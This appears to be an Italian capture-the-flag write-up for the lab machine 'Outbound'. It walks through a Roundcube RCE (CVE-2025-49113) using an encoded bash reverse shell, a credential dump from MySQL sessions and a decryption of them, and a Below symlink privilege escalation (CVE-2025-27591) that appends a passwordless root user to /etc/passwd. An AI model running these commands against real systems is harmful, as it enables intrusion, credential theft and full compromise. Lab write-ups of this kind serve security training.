# **Outbound**

![Outbound](./img/Outbound.png)

Machine Information
```text
As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2
```

## **Reconnaissance**
Si scansione la macchina target per rilevare porte TCP esposte.
```bash
$ nmap -p- --min-rate 1000 10.10.11.77 --open
```
```text
Nmap scan report for 10.10.11.77
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 37.94 seconds
```

Si analizzano le porte 22 e 80.  
```bash
$ nmap -p22,80 -sCV 10.10.11.77
```
```text
Nmap scan report for 10.10.11.77
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 14.71 seconds
```

I servizi esposti sono:
- OpenSSH 9.6 sulla porta 22/tcp, dalla quale e' possibile risalire alla versione di Ubuntu:

    - Ubuntu 24.04 (Noble)

- Nginx server versione 1.24.0 sulla porta 80/tcp, con server name mail.outbound.htb

Si aggiorna il file /etc/hosts aggiungendo un record per associare l'indirizzo IP della macchina target con relativo il server name.

```text
10.10.11.77 mail.outbound.htb
```

## **Logged in Roundcube as tyler**
Si visita l'URL.

![01](./img/01.png)

Si ispeziona il codice sorgente per rilevare la versione di **Roundcube**.

> Roundcube è un web-based IMAP email client.

Si ispeziona il codice sorgente del pagina per il login.

![02](./img/02.png)

- **Roundcube 1.06.10**

Si utilizzano le credenziali di **tyler:LhKL1o9Nm3X2** per accedere alla piattaforma.

![03](./img/03.png)

Si cercano CVE per questa particolare Roundcube 1.06.10.

## CVE-2025-49113
La CVE‑2025‑49113 sfrutta una vulnerabilità nella deserializzazione di oggetti PHP per una Post‑Auth Remote Code Execution.

Si utilizza la PoC di **fearsoff-org/CVE-2025-49113** [https://github.com/fearsoff-org/CVE-2025-49113](https://github.com/fearsoff-org/CVE-2025-49113).

![04](./img/04.png)

Si esegue una reverse shell lanciando una listener sulla macchina kali ed eseguendo l'exploit con il seguente payload:
```bash
# Listener
$ rlwrap -cAr nc -lvnp 4444
```
```bash
# RCE a reverse shell
$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjU2LzQ0NDQgMD4mMQ== | base64 -d | bash'
```

Si ottiene una shell come **www-data**.
```text
listening on [any] 4444 ...
connect to [10.10.16.x] from (UNKNOWN) [10.10.11.77] 59578
bash: cannot set terminal process group (256): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/var/www/html/roundcube/public_html$
```

## **Shell as www-data**
Si enumerano gli utenti che possono accedere alla shell.
```bash
www-data@mail:/var/www/html$ cat /etc/passwd | grep -E sh$
```
```
cat /etc/passwd | grep -E sh$
root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000::/home/tyler:/bin/bash
jacob:x:1001:1001::/home/jacob:/bin/bash
mel:x:1002:1002::/home/mel:/bin/bash
```

Si accede al file di configurazione **/var/www/html/roundcube/config/config.inc.php**.
```text
// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

Sono presenti delle credenziali per accedere a mysql e la **chiave DES** di decifratura delle password IMAP.

```bash
$ www-data@mail:/var/www/html/roundcube/public_html$ mysql -u roundcube -h localhost -D roundcube -pRCDBPass2025 -e 'SELECT * FROM users;' 
```
```
user_id username        mail_host       created last_login      failed_login    failed_login_counter    language        preferences
1       jacob   localhost       2025-06-07 13:55:18     2025-06-11 07:52:49     2025-06-11 07:51:32     1       en_US   a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2       mel     localhost       2025-06-08 12:04:51     2025-06-08 13:29:05     NULL    NULL    en_US   a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3       tyler   localhost       2025-06-08 13:28:55     2025-10-25 15:56:08     2025-06-11 07:51:22     1       en_US   a:2:{s:11:"client_hash";s:16:"68ZUMu0UP801hOU2";i:0;b:0;}
```

Sono presenti le credenziali di jacob, mel e tyler.

Si utilizza il repository Github **rcube-password-decryptor** [https://github.com/m1nhn/roundcube-password-decryptor/tree/master](https://github.com/m1nhn/roundcube-password-decryptor/tree/master) per decifrare le password.

Il repository suggerisce di cercare le password tra le **sessioni**.
```bash
www-data@mail:/var/www/html/roundcube$ mysql -u roundcube -h localhost -D roundcube -pRCDBPass2025 -e 'SELECT table_name FROM information_schema.tables WHERE table_schema = "roundcube"'
```
```text
cache
users
cache_shared
system
contacts
contactgroupmembers
filestore
responses
searches
dictionary
identities
cache_messages
collected_addresses
contactgroups
cache_thread
cache_index
session
```

```bash
www-data@mail:/var/www/html/roundcube$ mysql -u roundcube -h localhost -D roundcube -pRCDBPass2025 -e 'SELECT vars FROM session LIMIT 1' 
```
```
bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
```

Si decodifica il risultato in base64.
```text
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";%  
```

Si tenta di decifrare la seguente password di jacob:
```text
L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
```

Si modifica lo script **rcube-password-decryptor** [https://github.com/m1nhn/roundcube-password-decryptor/tree/master](https://github.com/m1nhn/roundcube-password-decryptor/tree/master) inserendo la password da decifrare e la chaive DES.
```bash
$ vim decrypt.php
# $encrypted = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
# $key = 'rcmail-!24ByteDESkey*Str';

$ php decrypt.php
```
```
🔓 Decrypted password: 595mO8DmwGeD
```

Si ottengono le credenziali **jacob:595mO8DmwGeD**. 

Si accede alla piaattaforma Roundcube come jacob.

![05](./img/05.png)

Si ispezionano le due mail nella casella di posta di jacob.

![06](./img/06.png)

Mel avvisa Jacob dell'introduzione del tool Below e dei nuovi privilegi da lui acquisiti per l'ispezione dei logs nel server.

![07](./img/07.png)

Tyler notiifica della nuova password **gY4Wr3a1evp4**.

## Shell as jacob
Si tenta l'accesso tramite SSH con **jacob:gY4Wr3a1evp4**

![08](./img/08.png)

Si accede al file **user.txt**.
```text
685e06b5bb427c193b1d15b1091c62c3
```

## **Privilege Escalation**
Si analizzano i privilegi per l'utente jacob.
```bash
jacob@outbound:~$ sudo -l
```
```
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

> Below è uno strumento per la memorizzazione e la visualizzazione di informazioni sul sistema.

```bash
jacob@outbound:~$ sudo /usr/bin/below help
```
```
Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help
```

Si identifica la versione di Below presente nella macchina.
```bash
jacob@outbound:~$ cat /opt/below/below/Cargo.toml | head -n5
```
```
# @generated by autocargo from //resctl/below:below

[package]
name = "below"
version = "0.8.0"
```

Si cercano vulnerabilità per **Below 0.8.0**.

## **CVE-2025-27591**

Le versioni di Below <0.9.0 sono vulnerabili a **symlink attack**. Below definisce la **/var/log/below/** come world-writable. 

![09](./img/09.png)

Come conseguenza un attaccante potrebbe sfruttare questa cattiva configurazione con un symlink attack, in modo da riuscire a manipolare risorse sensibili come /etc/passwd.

Come sfruttare questa vulnerabilità?
1. Si rimuove il file **/var/log/below/error_root.log** (*)
2. Si crea un **symbolic link** al file **/etc/passwd** con **/var/log/below/error_root.log**
3. Si esegue con Below con i privilegi di root e su\i sfrutta il fatto che Below definisce i permessi **0666** al file **/var/log/below/error_root.log** -> **/etc/passwd**
4. Si ha accesso al file **/etc/passwd** con i privilegi **0666**

(*) In una world-writable directory si possno eliminare file senza alcuna restrizione (no sticky bit).

> **Below: World Writable Directory in /var/log/below Allows Local Privilege Escalation (CVE-2025-27591) - SUSE Security Team Blog** [https://security.opensuse.org/2025/03/12/below-world-writable-log-dir.html](https://security.opensuse.org/2025/03/12/below-world-writable-log-dir.html)

```bash
# Replace the /var/log/below/error_root.log with a symlink to /etc/passwd
rm -f /var/log/below/error_root.log; ln -s /etc/passwd /var/log/below/error_root.log; 

# Execute Below with root privilege ( /var/log/below/error_root.log -> /etc/passwd 0666)
sudo /usr/bin/below record; 

# Exploit the symlink file privilege (0666)
echo 'pwn::0:0:root:/root:/bin/bash' >> /var/log/below/error_root.log && su pwn
```

Si lancia l'exploit.
```bash
jacob@outbound:~$ rm -f /var/log/below/error_root.log; ln -s /etc/passwd /var/log/below/error_root.log; sudo /usr/bin/below record; echo 'pwn::0:0:root:/root:/bin/bash' >> /var/log/below/error_root.log && su pwn
```
```
Oct 25 22:07:14.498 DEBG Starting up!
Oct 25 22:07:14.498 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01761350400: EAGAIN: Try again
-------------------------------------------------------------
root@outbound:/home/jacob# id
uid=0(root) gid=0(root) groups=0(root)
```

## **Shell as root**
Si ha accesso al file **root.txt**
```
root@outbound:/home/jacob# cat /root/root.txt
d054417b501c28d15933f407977c32d7
```
